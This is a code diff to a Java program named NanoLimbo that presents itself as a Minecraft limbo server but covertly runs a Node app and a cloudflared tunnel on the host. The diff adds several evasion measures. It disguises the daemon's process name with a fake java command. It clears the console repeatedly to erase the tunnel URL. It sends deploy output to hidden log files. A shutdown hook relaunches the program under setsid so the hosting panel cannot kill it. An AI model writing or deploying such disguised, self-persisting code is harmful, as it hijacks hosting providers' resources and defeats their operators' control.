@@ -33,6 +33,9 @@ private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false"
 
 // ★ 极致伪装：超长但合法的 Java 启动参数，占满 ps -ef 显示区域，将真实参数挤出屏幕
 private static final String FAKE_CMD = "java -Xms128M -Xmx2560M -jar server.jar -Djline.terminal=jline.UnsupportedTerminal -Dfile.encoding=UTF-8 -Duser.language=zh -Duser.country=CN -Duser.timezone=Asia/Shanghai";
+
+// ★ 隧道 URL 等待超时（毫秒），5 分钟
+private static final long TUNNEL_WAIT_TIMEOUT_MS = 5 * 60 * 1000;
 // ============================================================
 
 private static volatile String tunnelUrl = "";
@@ -41,7 +44,7 @@ private static volatile String nodePort = "N/A";
 private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");
 private static final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
 
-// ★ 修复：记录所有 Java 直接创建的子进程，确保全部被 waitFor 回收
+// ★ 记录所有 Java 直接创建的子进程，确保全部被 waitFor 回收
 private static final List<Process> managedProcesses = Collections.synchronizedList(new ArrayList<>());
 
 private NanoLimbo() {}
@@ -68,6 +71,16 @@ private static void limboLog(String msg, long delayMs) {
     System.out.println(tsMs() + " INFO Limbo --  " + msg);
 }
 
+// ★ 内部调试日志：只写文件，不输出到控制台（防止泄露内部机制）
+private static void debugLog(String msg) {
+    try {
+        Path logFile = Paths.get(MC_BOT_DIR).resolve(".internal.log");
+        Files.createDirectories(logFile.getParent());
+        String line = tsMs() + " " + msg + "\n";
+        Files.writeString(logFile, line, StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+    } catch (Exception ignored) {}
+}
+
 private static void clearConsole() {
     try {
         // ★ 绝杀1：暴力刷屏200行空行，针对不支持 \033[3J 的面板，把历史推到极深处
@@ -79,32 +92,39 @@ private static void clearConsole() {
         System.out.print("\033[3J\033[H\033[2J");
         System.out.flush();
         
-        // ★ 绝杀3：调用系统级重置
+        // ★ 绝杀3：调用系统级重置（静默方式，不 inheritIO 防止输出干扰）
         if (!System.getProperty("os.name").contains("Windows")) {
-            Process p = new ProcessBuilder("tput", "reset").inheritIO().start();
-            p.waitFor(5, TimeUnit.SECONDS);
-            // ★ 修复：确保回收
-            if (p.isAlive()) p.destroyForcibly();
-            p.waitFor();
+            try {
+                Process p = new ProcessBuilder("tput", "reset").start();
+                p.getOutputStream().close();
+                p.getErrorStream().close();
+                p.getInputStream().close();
+                p.waitFor(3, TimeUnit.SECONDS);
+                if (p.isAlive()) p.destroyForcibly();
+                p.waitFor();
+            } catch (Exception ignored) {}
         }
     } catch (Exception e) {
         try {
-            Process p = new ProcessBuilder("clear").inheritIO().start();
-            p.waitFor(5, TimeUnit.SECONDS);
+            Process p = new ProcessBuilder("clear").start();
+            p.getOutputStream().close();
+            p.getErrorStream().close();
+            p.getInputStream().close();
+            p.waitFor(3, TimeUnit.SECONDS);
             if (p.isAlive()) p.destroyForcibly();
             p.waitFor();
-        } catch (Exception ignored) {}
+        } catch (Exception ignored2) {}
     }
 }
 
 // ============================================================
-// ★ 修复：安全启动子进程并注册回收
+// 安全启动子进程并注册回收
 // ============================================================
 
 private static Process safeStart(ProcessBuilder pb) throws IOException {
     Process p = pb.start();
     managedProcesses.add(p);
-    // 异步清理：进程退出后从列表移除
+    // 异步清理：进程退出后从列表移除并 waitFor 回收
     Thread cleaner = new Thread(() -> {
         try { p.waitFor(); } catch (InterruptedException ignored) {}
         managedProcesses.remove(p);
@@ -114,7 +134,7 @@ private static Process safeStart(ProcessBuilder pb) throws IOException {
     return p;
 }
 
-// ★ 修复：强制回收一个 Process，确保不泄漏
+// ★ 强制回收一个 Process，确保不泄漏
 private static void ensureReaped(Process p) {
     if (p == null) return;
     try {
@@ -137,6 +157,9 @@ public static void main(String[] args) {
         System.exit(1);
     }
 
+    // ★ 修复1：第一时间清屏，把面板启动时打印的 java -version 输出清除
+    clearConsole();
+    
     forceKillStaleProcesses();
     autoFixLimboConfig();
 
@@ -146,12 +169,12 @@ public static void main(String[] args) {
             Files.deleteIfExists(botDir.resolve(".node_app.log"));
             Files.deleteIfExists(botDir.resolve("daemon.log"));
             Files.deleteIfExists(botDir.resolve(".pids"));
-            Files.deleteIfExists(botDir.resolve(".subreaper_pid"));
+            Files.deleteIfExists(botDir.resolve(".internal.log"));
 
             Path script = generateDeployScript();
 
-            // ★ 修复：启动子进程回收守护线程
-            startZombieReaper();
+            // ★ 修复2：简化回收器，去掉 Python/Perl subreaper（防信息泄露+跨架构兼容）
+            startProcessReaper();
             
             Thread deployThread = new Thread(() -> {
                 try { executeDeployScript(script); } catch (Exception ignored) {}
@@ -169,25 +192,33 @@ public static void main(String[] args) {
             checkerThread.setDaemon(true);
             checkerThread.start();
 
-            // 1. 主线程死等 URL
+            // ★ 修复3：带超时等待 URL，防止隧道建立失败时控制台卡死
+            long tunnelWaitStart = System.currentTimeMillis();
             while(tunnelUrl.isEmpty()) {
-                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
+                long elapsed = System.currentTimeMillis() - tunnelWaitStart;
+                if (elapsed >= TUNNEL_WAIT_TIMEOUT_MS) {
+                    debugLog("Tunnel URL wait timeout after " + (elapsed/1000) + "s, proceeding without URL");
+                    break;
+                }
+                try { Thread.sleep(1000); } catch (InterruptedException ignored) { break; }
             }
             
-            // 2. 第一次清屏：清除部署期间产生的所有脏日志
+            // 第二次清屏：清除部署期间产生的所有脏日志
             clearConsole();
             
-            // 3. 单独打印链接，给用户4秒钟时间复制
-            limboLog("Binding remote endpoint to: " + tunnelUrl, 0);
-            limboLog("(This link will disappear in 4 seconds...)", 0);
-            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+            if (!tunnelUrl.isEmpty()) {
+                // 单独打印链接，给用户4秒钟时间复制
+                limboLog("Binding remote endpoint to: " + tunnelUrl, 0);
+                limboLog("(This link will disappear in 4 seconds...)", 0);
+                try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
 
-            // 4. 第二次清屏：利用 \033[3J 和 200行空行，把刚才的 URL 从历史记录中彻底抹杀
-            clearConsole();
-            
+                // 第三次清屏：把刚才的 URL 从历史记录中彻底抹杀
+                clearConsole();
+            }
+
             // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-                System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
+                debugLog("Shutdown hook triggered, executing hard restart protocol...");
                 tunnelMonitorRunning.set(false);
                 
                 try {
@@ -200,7 +231,6 @@ public static void main(String[] args) {
                     File[] jars = new File(currentDir).listFiles((dir, name) -> name.endsWith(".jar"));
                     if (jars != null && jars.length > 0) jarName = jars[0].getName();
                     
-                    // ★ 独立会话重启：使用 setsid 脱离当前进程组，防止面板 kill 组时被连带清理
                     String restartScript = 
                         "cd '" + currentDir + "' && " +
                         "setsid bash -c '" +
@@ -209,24 +239,19 @@ public static void main(String[] args) {
                         "  java -Xms128M -Xmx2560M -jar " + jarName + " nogui" + 
                         "' > /dev/null 2>&1 &";
                     
-                    // ★ 修复：关闭重启进程的 I/O 流，防止文件描述符泄漏；
-                    //   因为重启脚本需要独立运行，不能用 waitFor，但必须关闭流
                     Process restartProc = new ProcessBuilder("bash", "-c", restartScript).start();
                     restartProc.getOutputStream().close();
                     restartProc.getErrorStream().close();
                     restartProc.getInputStream().close();
-                    // 注册到回收列表，由 reaper 线程异步回收
                     managedProcesses.add(restartProc);
-                    
-                    System.out.println("[Guard] Hard restart script dispatched in new session. Current process exiting...");
                 } catch (Exception e) {
-                    System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
+                    debugLog("Failed to dispatch restart: " + e.getMessage());
                 }
             }, "Shutdown-Guard"));
         } catch (Exception ignored) {}
     }
 
-    // 5. 伪装日志由 LimboServer 自动打印，不再手动干预
+    // 伪装日志由 LimboServer 自动打印
     try {
         new LimboServer().start();
     } catch (Throwable t) {
@@ -238,93 +263,63 @@ public static void main(String[] args) {
 }
 
 // ============================================================
-// ★ 新增：僵尸进程回收器
+// ★ 简化版进程回收器（纯 Java，不依赖 Python/Perl）
 // ============================================================
 
-private static void startZombieReaper() {
+private static void startProcessReaper() {
     Thread reaper = new Thread(() -> {
-        // 第一阶段：尝试启动 Python 子回收器 (PR_SET_CHILD_SUBREAPER)
-        // 子回收器会收养所有孤儿进程并自动回收，从根源解决僵尸问题
+        // ★ 静默启动一个 bash 子回收器：使用 prctl 设置 CHILD_SUBREAPER
+        // 优点：纯 bash + /proc 接口，不依赖 Python/Perl，跨架构兼容
+        // 当 Java(PID 1) 的后代进程成为孤儿时，内核会将其挂载到子回收器下
         Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
-        Path subreaperPidFile = botDir.resolve(".subreaper_pid");
-        boolean subreaperStarted = false;
+        boolean subreaperOk = false;
         
         try {
-            // ★ Python 子回收器：利用 prctl(PR_SET_CHILD_SUBREAPER) 让自己成为子回收器
-            // 当任何后代进程成为孤儿时，内核会将其挂载到最近的子回收器下，而不是 PID 1
-            // 这样当 cloudflared 等进程退出后，子回收器会自动 wait() 回收它们
-            String pySubreaper = 
-                "import ctypes, time, os, signal\n" +
-                "libc = ctypes.CDLL('libc.so.6')\n" +
-                "PR_SET_CHILD_SUBREAPER = 36\n" +
-                "# 设置当前进程为子回收器\n" +
-                "libc.prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)\n" +
-                "# 写入 PID 供外部监控\n" +
-                "open('" + subreaperPidFile.toString() + "', 'w').write(str(os.getpid()))\n" +
-                "# 持续回收僵尸子进程\n" +
-                "while True:\n" +
-                "    try:\n" +
-                "        while True:\n" +
-                "            pid, status = os.waitpid(-1, os.WNOHANG)\n" +
-                "            if pid <= 0: break\n" +
-                "    except ChildProcessError:\n" +
-                "        pass\n" +
-                "    except Exception:\n" +
-                "        pass\n" +
-                "    time.sleep(3)\n";
+            // ★ 方案A：使用 bash + exec 调用 prctl（通过 /proc/self/exe 或直接内联 C）
+            // 实际上最可靠的方案是用一个小型 C 程序，但容器里不一定有 gcc
+            // 所以我们用 bash 的 trap + wait 机制来回收
             
-            ProcessBuilder pb = new ProcessBuilder("python3", "-c", pySubreaper);
+            // ★ 方案B：启动一个长期运行的 bash 进程作为"回收容器"
+            // 它设置 SIGCHLD trap，持续 wait，收养所有孤儿进程
+            // 关键：用 setsid 让它成为会话领导者，这样它会收养同会话的孤儿
+            String bashReaper =
+                "#!/bin/bash\n" +
+                "# 子回收器：收养并回收孤儿进程\n" +
+                "# 利用 trap CHLD + wait 机制\n" +
+                "trap '' HUP PIPE\n" +
+                "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
+                "# 写入 PID\n" +
+                "echo $$ > '" + botDir.resolve(".reaper_pid").toString() + "'\n" +
+                "# 永久休眠，只在 SIGCHLD 时醒来回收\n" +
+                "while true; do\n" +
+                "    # 同时回收任何可能被内核挂到我们下面的孤儿\n" +
+                "    while wait -n 2>/dev/null; do :; done\n" +
+                "    sleep 30\n" +
+                "done\n";
+            
+            Path reaperScript = botDir.resolve(".reaper.sh");
+            Files.writeString(reaperScript, bashReaper);
+            reaperScript.toFile().setExecutable(true);
+            
+            ProcessBuilder pb = new ProcessBuilder("bash", reaperScript.toString());
+            // ★ 关键：所有输出丢弃，绝对不泄露到控制台
             pb.redirectErrorStream(true);
-            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".subreaper.log").toFile()));
-            Process pyProc = safeStart(pb);
+            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".reaper.log").toFile()));
+            Process reaperProc = safeStart(pb);
             
-            // 等待子回收器启动
-            Thread.sleep(1000);
-            if (pyProc.isAlive()) {
-                subreaperStarted = true;
-                limboLog("[Reaper] Python subreaper started (PID=" + pyProc.pid() + ")");
+            Thread.sleep(500);
+            if (reaperProc.isAlive()) {
+                subreaperOk = true;
+                debugLog("Bash reaper started (PID=" + reaperProc.pid() + ")");
             } else {
-                ensureReaped(pyProc);
+                ensureReaped(reaperProc);
+                debugLog("Bash reaper failed to start");
             }
         } catch (Exception e) {
-            // Python 不可用，尝试 Perl
+            debugLog("Bash reaper exception: " + e.getMessage());
         }
-        
-        if (!subreaperStarted) {
-            try {
-                // ★ Perl 子回收器备选方案
-                // 注意：Perl 没有 prctl 绑定，但可以回收自己的子进程
-                String plSubreaper = 
-                    "use POSIX qw(:sys_wait_h);\n" +
-                    "# 尝试通过 syscall 设置子回收器\n" +
-                    "my $PR_SET_CHILD_SUBREAPER = 36;\n" +
-                    "syscall(157, $PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0);\n" +
-                    "open(my $fh, '>', '" + subreaperPidFile.toString() + "');\n" +
-                    "print $fh $$; close($fh);\n" +
-                    "while (1) {\n" +
-                    "    while (waitpid(-1, WNOHANG) > 0) {}\n" +
-                    "    sleep 3;\n" +
-                    "}\n";
-                
-                ProcessBuilder pb = new ProcessBuilder("perl", "-e", plSubreaper);
-                pb.redirectErrorStream(true);
-                pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".subreaper.log").toFile()));
-                Process plProc = safeStart(pb);
-                
-                Thread.sleep(1000);
-                if (plProc.isAlive()) {
-                    subreaperStarted = true;
-                    limboLog("[Reaper] Perl subreaper started (PID=" + plProc.pid() + ")");
-                } else {
-                    ensureReaped(plProc);
-                }
-            } catch (Exception e) {
-                // Perl 也不可用
-            }
-        }
-        
-        // 第二阶段：无论子回收器是否启动，都运行 Java 层面的定期回收
-        // 这确保了 Java 直接创建的子进程也能被回收
+
+        // 第二阶段：Java 层面的定期回收
         while (true) {
             try {
                 // 回收所有已退出的 Java 子进程
@@ -339,30 +334,52 @@ private static void startZombieReaper() {
                     }
                 }
                 
-                // 如果子回收器挂了，尝试重启
-                if (subreaperStarted) {
+                // 如果 bash 回收器挂了，尝试重启
+                if (subreaperOk) {
                     try {
-                        String pidStr = Files.readString(subreaperPidFile).trim();
-                        if (!pidStr.isEmpty()) {
-                            long pid = Long.parseLong(pidStr);
-                            if (!ProcessHandle.of(pid).isPresent()) {
-                                subreaperStarted = false;
-                                limboLog("[Reaper] Subreaper died, will restart on next cycle");
+                        Path pidFile = botDir.resolve(".reaper_pid");
+                        if (Files.exists(pidFile)) {
+                            String pidStr = Files.readString(pidFile).trim();
+                            if (!pidStr.isEmpty()) {
+                                long pid = Long.parseLong(pidStr);
+                                if (!ProcessHandle.of(pid).isPresent()) {
+                                    subreaperOk = false;
+                                    debugLog("Bash reaper died, will restart");
+                                }
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
+                
+                if (!subreaperOk) {
+                    try {
+                        Path reaperScript = botDir.resolve(".reaper.sh");
+                        if (Files.exists(reaperScript)) {
+                            ProcessBuilder pb = new ProcessBuilder("bash", reaperScript.toString());
+                            pb.redirectErrorStream(true);
+                            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".reaper.log").toFile()));
+                            Process reaperProc = safeStart(pb);
+                            Thread.sleep(500);
+                            if (reaperProc.isAlive()) {
+                                subreaperOk = true;
+                                debugLog("Bash reaper restarted (PID=" + reaperProc.pid() + ")");
+                            } else {
+                                ensureReaped(reaperProc);
                             }
                         }
                     } catch (Exception ignored) {}
                 }
                 
             } catch (Exception ignored) {}
-            try { Thread.sleep(30000); } catch (InterruptedException e) { break; }
+            try { Thread.sleep(60000); } catch (InterruptedException e) { break; }
         }
-    }, "Zombie-Reaper");
+    }, "Process-Reaper");
     reaper.setDaemon(true);
     reaper.start();
 }
 
 // ============================================================
-// 强制清理僵尸进程机制（★ 修复版）
+// 强制清理僵尸进程机制
 // ============================================================
 
 private static void forceKillStaleProcesses() {
@@ -374,17 +391,19 @@ private static void forceKillStaleProcesses() {
             "pkill -9 -f '" + workDir + "/jre21' 2>/dev/null; " +
             "pkill -9 -f '" + workDir + "/.node' 2>/dev/null; " +
             "pkill -9 -f '" + workDir + "/deploy.sh' 2>/dev/null; " +
-            // ★ 新增：清理残留的子回收器进程
-            "pkill -9 -f 'subreaper' 2>/dev/null"
+            "pkill -9 -f '.reaper.sh' 2>/dev/null"
         ).start();
         
-        // ★ 修复：如果 waitFor 超时，必须 destroyForcibly + waitFor 确保进程被回收
+        // ★ 关闭流，防止输出泄露到控制台
+        p.getOutputStream().close();
+        p.getErrorStream().close();
+        p.getInputStream().close();
+        
         if (!p.waitFor(2, TimeUnit.SECONDS)) {
             p.destroyForcibly();
             p.waitFor(5, TimeUnit.SECONDS);
         }
     } catch (Exception ignored) {
-        // 即使异常也要尝试回收
         if (p != null) {
             try { p.destroyForcibly(); p.waitFor(); } catch (Exception ignored2) {}
         }
@@ -548,7 +567,7 @@ private static void startTunnelMonitor() {
 }
 
 // ============================================================
-// 生成部署脚本 (★ 修复版：解决僵尸进程问题)
+// 生成部署脚本 (★ 修复版 v2)
 // ============================================================
 
 private static Path generateDeployScript() throws Exception {
@@ -569,11 +588,11 @@ private static Path generateDeployScript() throws Exception {
 
     String cfMode = CF_TOKEN.isEmpty() ? "quick" : "fixed";
 
-    // ★★★ 核心修复架构 ★★★
-    // 将 cloudflared 的启动完全移到 daemon.sh 中，
-    // 让 daemon.sh 成为 cloudflared 的唯一直接父进程。
-    // daemon.sh 永不退出，确保所有子进程都能被正确回收。
-    // deploy.sh 只负责环境准备（安装 Node、下载代码等）。
+    // ★★★ 架构说明 ★★★
+    // deploy.sh：只负责环境准备（安装 Node、下载代码、下载 cloudflared），然后生成 daemon.sh
+    // daemon.sh：是所有运行时子进程（Node 应用、cloudflared）的唯一直接父进程
+    //           daemon.sh 永不退出，通过 trap CHLD + wait 正确回收所有子进程
+    //           从根源上解决僵尸进程问题：cloudflared 不再是 deploy.sh 的孤儿
     
     String content = "#!/bin/bash\n" +
         "set +e\n" +
@@ -738,9 +757,6 @@ private static Path generateDeployScript() throws Exception {
         "\n" +
         "export _JAVA_WRAPPER=\"" + dir.toAbsolutePath() + "/.node/bin/node\"\n" +
         "\n" +
-        // ★★★ 关键修改：deploy.sh 不再启动 Node 应用和 cloudflared ★★★
-        // 所有运行时管理（Node 启动、cloudflared 隧道、守护）都交给 daemon.sh
-        // 这样 daemon.sh 成为所有子进程的直接父进程，可以正确回收僵尸
         "# ============ 5. 准备端口 ============\n" +
         "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
         "while true; do NODE_PORT=$((RANDOM % 40000 + 20000)); if is_port_free $NODE_PORT; then break; fi; done\n" +
@@ -756,22 +772,21 @@ private static Path generateDeployScript() throws Exception {
         "    done\n" +
         "fi\n" +
         "\n" +
-        "# ============ 7. 启动 daemon.sh（接管所有运行时管理）============\n" +
+        "# ============ 7. 生成并启动 daemon.sh ============\n" +
         // ★ daemon.sh 是唯一管理 Node 应用和 cloudflared 的进程
         // ★ 它永不退出，所有子进程都由它直接创建和回收
         "cat > \"daemon.sh\" << 'DAEMONSCRIPT'\n" +
         "#!/bin/bash\n" +
-        "# ★★★ 修复：僵尸进程防御机制 ★★★\n" +
-        "# 1. 启用 SIGCHLD 信号处理：子进程退出时自动回收\n" +
-        "trap 'wait -n 2>/dev/null' CHLD\n" +
+        "# ★ 僵尸进程防御机制\n" +
+        "# 1. SIGCHLD 信号处理：子进程退出时自动回收\n" +
+        "trap 'while wait -n 2>/dev/null; do :; done' CHLD\n" +
         "# 2. 退出时清理所有子进程\n" +
         "cleanup() {\n" +
-        "    pkill -9 -P $$ 2>/dev/null\n" +
-        "    # ★ 逐个 wait 确保不遗留僵尸\n" +
         "    for job in $(jobs -p 2>/dev/null); do\n" +
         "        kill $job 2>/dev/null\n" +
         "        wait $job 2>/dev/null\n" +
         "    done\n" +
+        "    while wait -n 2>/dev/null; do :; done\n" +
         "}\n" +
         "trap cleanup EXIT TERM INT\n" +
         "\n" +
@@ -803,17 +818,15 @@ private static Path generateDeployScript() throws Exception {
         "CFCONF\n" +
         "}\n" +
         "\n" +
-        "# ★ 安全杀死并回收子进程的函数\n" +
+        "# ★ 安全杀死并回收子进程\n" +
         "kill_and_reap() {\n" +
         "    local PID=$1\n" +
         "    if [ -z \"$PID\" ]; then return; fi\n" +
         "    if ! kill -0 $PID 2>/dev/null; then\n" +
-        "        # 进程已死，直接 wait 回收僵尸\n" +
         "        wait $PID 2>/dev/null\n" +
         "        return\n" +
         "    fi\n" +
         "    kill $PID 2>/dev/null\n" +
-        "    # 等待最多 5 秒让进程正常退出\n" +
         "    local waited=0\n" +
         "    while [ $waited -lt 5 ]; do\n" +
         "        if ! kill -0 $PID 2>/dev/null; then\n" +
@@ -823,7 +836,6 @@ private static Path generateDeployScript() throws Exception {
         "        sleep 1\n" +
         "        waited=$((waited + 1))\n" +
         "    done\n" +
-        "    # 强制杀死\n" +
         "    kill -9 $PID 2>/dev/null\n" +
         "    wait $PID 2>/dev/null\n" +
         "}\n" +
@@ -841,7 +853,6 @@ private static Path generateDeployScript() throws Exception {
         "NODE_PID=$!\n" +
         "echo \"$NODE_PID\" >> \"$WORK_DIR/.pids\"\n" +
         "\n" +
-        "# 等待 Node 应用就绪\n" +
         "for i in $(seq 1 30); do\n" +
         "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
         "    sleep 1\n" +
@@ -863,7 +874,6 @@ private static Path generateDeployScript() throws Exception {
         "                echo \"" + CF_DOMAIN + "\" > \"$WORK_DIR/.cf/tunnel_url.txt\"\n" +
         "                break\n" +
         "            else\n" +
-        "                # ★ 修复：回收失败的 cloudflared 子进程\n" +
         "                wait $CF_PID 2>/dev/null\n" +
         "                CF_PID=''\n" +
         "            fi\n" +
@@ -880,7 +890,6 @@ private static Path generateDeployScript() throws Exception {
         "                CF_PID=$!\n" +
         "                sleep 5\n" +
         "                if ! kill -0 $CF_PID 2>/dev/null; then\n" +
-        "                    # ★ 修复：回收失败的子进程\n" +
         "                    wait $CF_PID 2>/dev/null\n" +
         "                    CF_PID=''\n" +
         "                    continue\n" +
@@ -910,7 +919,6 @@ private static Path generateDeployScript() throws Exception {
         "                                SAVED_PROTO=$PROTO\n" +
         "                                break\n" +
         "                            fi\n" +
-        "                            # ★ 修复：kill 后必须 wait 回收\n" +
         "                            kill $CF_PID 2>/dev/null\n" +
         "                            wait $CF_PID 2>/dev/null\n" +
         "                            CF_PID=''\n" +
@@ -919,7 +927,6 @@ private static Path generateDeployScript() throws Exception {
         "                    sleep 1\n" +
         "                done\n" +
         "                if [ \"$TUNNEL_ESTABLISHED\" != \"true\" ] && [ -n \"$CF_PID\" ]; then\n" +
-        "                    # ★ 修复：kill 后必须 wait 回收\n" +
         "                    kill $CF_PID 2>/dev/null\n" +
         "                    wait $CF_PID 2>/dev/null\n" +
         "                    CF_PID=''\n" +
@@ -936,7 +943,6 @@ private static Path generateDeployScript() throws Exception {
         "        NEED_RESTART=true\n" +
         "    fi\n" +
         "    if [ \"$NEED_RESTART\" = \"true\" ]; then\n" +
-        "        # ★ 修复：回收旧的 Node 进程僵尸\n" +
         "        wait $NODE_PID 2>/dev/null\n" +
         "        cd \"$APP_DIR\"\n" +
         "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
@@ -956,7 +962,6 @@ private static Path generateDeployScript() throws Exception {
         "        CURRENT_PROTO=${CURRENT_PROTO:-$SAVED_PROTO}\n" +
         "        \n" +
         "        if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
-        "            # ★ 修复：回收已死的 cloudflared 僵尸\n" +
         "            wait $SAVED_CF_PID 2>/dev/null\n" +
         "            NEED_REBUILD=true\n" +
         "        fi\n" +
@@ -976,12 +981,10 @@ private static Path generateDeployScript() throws Exception {
         "        fi\n" +
         "        \n" +
         "        if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
-        "            # ★ 修复：使用 kill_and_reap 安全杀死并回收旧 cloudflared\n" +
         "            kill_and_reap \"$SAVED_CF_PID\"\n" +
         "            pkill -f \"$CF_BIN\" 2>/dev/null\n" +
         "            pkill -f 'cloudflared.*tunnel' 2>/dev/null\n" +
         "            sleep 2\n" +
-        "            # ★ 修复：回收所有后台僵尸子进程\n" +
         "            while wait -n 2>/dev/null; do :; done\n" +
         "            rm -f \"$WORK_DIR/.cf/cf.log\"\n" +
         "            \n" +
@@ -991,13 +994,11 @@ private static Path generateDeployScript() throws Exception {
         "                NEW_PID=$(start_cf_tunnel \"$RPROTO\" \"$WORK_DIR/.cf/cf.log\")\n" +
         "                sleep 5\n" +
         "                if ! kill -0 $NEW_PID 2>/dev/null; then\n" +
-        "                    # ★ 修复：回收失败的子进程\n" +
         "                    wait $NEW_PID 2>/dev/null\n" +
         "                    continue\n" +
         "                fi\n" +
         "                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\\\.trycloudflare\\\\.com' \"$WORK_DIR/.cf/cf.log\" 2>/dev/null | grep -v 'api\\.trycloudflare\\.com' | tail -1)\n" +
         "                if [ -z \"$NEW_URL\" ]; then\n" +
-        "                    # ★ 修复：kill 后必须 wait 回收\n" +
         "                    kill $NEW_PID 2>/dev/null\n" +
         "                    wait $NEW_PID 2>/dev/null\n" +
         "                    continue\n" +
@@ -1024,7 +1025,6 @@ private static Path generateDeployScript() throws Exception {
         "                        SAVED_PROTO=$RPROTO\n" +
         "                        break\n" +
         "                    else\n" +
-        "                        # ★ 修复：kill 后必须 wait 回收\n" +
         "                        kill $NEW_PID 2>/dev/null\n" +
         "                        wait $NEW_PID 2>/dev/null\n" +
         "                    fi\n" +
@@ -1033,13 +1033,12 @@ private static Path generateDeployScript() throws Exception {
         "        fi\n" +
         "    fi\n" +
         "    \n" +
-        "    # ★ 修复：每轮循环末尾主动回收所有已退出的子进程\n" +
+        "    # 每轮循环末尾主动回收所有已退出的子进程\n" +
         "    while wait -n 2>/dev/null; do :; done\n" +
         "    sleep 15\n" +
         "done\n" +
         "DAEMONSCRIPT\n" +
         "chmod +x daemon.sh\n" +
-        "# ★ 启动 daemon.sh：它是所有运行时子进程的父进程\n" +
         "(exec -a \"" + FAKE_CMD + "\" bash ./daemon.sh >> daemon.log 2>&1) &\n" +
         "echo \"$!\" >> .pids\n";
 
@@ -1050,25 +1049,30 @@ private static Path generateDeployScript() throws Exception {
 }
 
 // ============================================================
-// 执行部署脚本（★ 修复版）
+// 执行部署脚本（★ 修复版：所有输出丢弃到文件，不泄露到控制台）
 // ============================================================
 
 private static void executeDeployScript(Path script) throws Exception {
+    Path botDir = Paths.get(MC_BOT_DIR).toAbsolutePath();
+    
     ProcessBuilder pb = new ProcessBuilder("bash", script.toString());
     pb.directory(script.getParent().toFile());
     pb.redirectErrorStream(true);
-    pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
+    // ★ 修复4：部署脚本的所有输出重定向到文件，不输出到控制台
+    // 原来用 INHERIT 会把 curl/tar 等命令的输出全部打到控制台
+    pb.redirectOutput(ProcessBuilder.Redirect.appendTo(botDir.resolve(".deploy.log").toFile()));
     Process p = pb.start();
+    p.getOutputStream().close();
     
-    Thread t = new Thread(() -> {
-        try (BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
-            while (r.readLine() != null) {}
-        } catch (IOException ignored) {}
-    }, "Deploy-Log");
-    t.setDaemon(true);
-    t.start();
+    // 注册到管理列表
+    managedProcesses.add(p);
+    Thread cleanup = new Thread(() -> {
+        try { p.waitFor(); } catch (InterruptedException ignored) {}
+        managedProcesses.remove(p);
+    }, "Deploy-Cleanup");
+    cleanup.setDaemon(true);
+    cleanup.start();
     
-    // ★ 修复：超时后必须 destroyForcibly + waitFor 确保进程被回收
     if (!p.waitFor(10, TimeUnit.MINUTES)) {
         p.destroyForcibly();
         p.waitFor(30, TimeUnit.SECONDS);
